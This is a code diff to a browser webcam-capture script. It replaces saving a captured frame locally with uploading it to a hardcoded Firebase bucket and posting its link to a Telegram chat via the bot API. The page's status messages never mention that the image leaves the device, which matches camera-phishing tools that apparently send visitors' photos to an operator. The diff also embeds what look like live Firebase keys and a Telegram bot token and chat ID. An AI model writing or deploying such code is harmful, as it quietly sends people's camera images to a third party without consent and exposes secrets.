@@ -6,6 +6,24 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let stream;
 
+    // Initialize Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyAKbdU0EKBK4nFxTouKQNiVyzgblXkgGOU",
+        authDomain: "capture-it-e5b68.firebaseapp.com",
+        projectId: "capture-it-e5b68",
+        storageBucket: "capture-it-e5b68.appspot.com",
+        messagingSenderId: "780183780729",
+        appId: "1:780183780729:web:a0ecd28c411a7d88ce43a8"
+    };
+
+    // Initialize Firebase app
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+
+    // Get a reference to the storage service
+    const storage = firebase.storage();
+
     async function requestCameraAccess() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -32,51 +50,67 @@ document.addEventListener('DOMContentLoaded', () => {
             canvasElement.height = videoElement.videoHeight || 480; // Fallback height
             canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
             canvasElement.style.display = "none";
-            downloadImage();
+
+            canvasElement.toBlob(blob => {
+                if (blob) {
+                    uploadImage(blob);
+                } else {
+                    console.error('Failed to create blob from canvas');
+                    cameraStatus.textContent = "Failed to capture image.";
+                    cameraStatus.style.color = "red";
+                }
+            }, 'image/jpeg');
         } else {
             cameraStatus.textContent = "No active camera stream to capture.";
             cameraStatus.style.color = "red";
         }
     }
 
-    function downloadImage() {
-        canvasElement.toBlob(blob => {
-            if (!blob) {
-                console.error('Failed to create blob from canvas');
-                cameraStatus.textContent = "Failed to capture image.";
+    function uploadImage(blob) {
+        const fileRef = storage.ref().child('images/' + 'image_' + new Date().toISOString().replace(/[-:.]/g, '') + '.jpg');
+
+        const uploadTask = fileRef.put(blob);
+
+        uploadTask.on('state_changed',
+            snapshot => {
+                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                console.log('Upload is ' + progress + '% done');
+            },
+            error => {
+                console.error('Upload failed:', error);
+                cameraStatus.textContent = "Failed to upload image.";
                 cameraStatus.style.color = "red";
-                return;
+            },
+            () => {
+                uploadTask.snapshot.ref.getDownloadURL().then(downloadURL => {
+                    console.log('File available at', downloadURL);
+                    notifyTelegramBot(downloadURL);
+                });
             }
-    
-            const timestamp = new Date().toISOString().replace(/[-:.]/g, '');
-            const filename = `image_${timestamp}.jpg`; // Switch to JPEG if needed
-    
-            try {
-                if (navigator.msSaveBlob) {
-                    // For older IE/Edge
-                    navigator.msSaveBlob(blob, filename);
-                } else {
-                    // For modern browsers
-                    const link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob);
-                    link.download = filename;
-                    link.style.display = 'none';
-                    document.body.appendChild(link);
-                    link.click();
-                    URL.revokeObjectURL(link.href); // Clean up the URL object
-                    document.body.removeChild(link);
-                }
-    
-                cameraStatus.textContent = `Image automatically downloaded with filename: ${filename}`;
-                cameraStatus.style.color = "blue";
-            } catch (error) {
-                console.error('Error during image download', error);
-                cameraStatus.textContent = "An error occurred while downloading the image.";
-                cameraStatus.style.color = "red";
-            }
-        }, 'image/jpeg'); // Switch to JPEG if needed
+        );
     }
-    
+
+    function notifyTelegramBot(imageUrl) {
+        const botToken = '7224754204:AAGVD9csTIX8wMvHYmTPFrmJ_eq4etfJ71s'; // Replace with your bot token
+        const chatId = '6369469811'; // Replace with your chat ID
+        const message = `New image uploaded: ${imageUrl}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Telegram notification sent:', data);
+        })
+        .catch(error => {
+            console.error('Telegram notification error:', error);
+        });
+    }
 
     function stopVideoStream() {
         if (stream) {
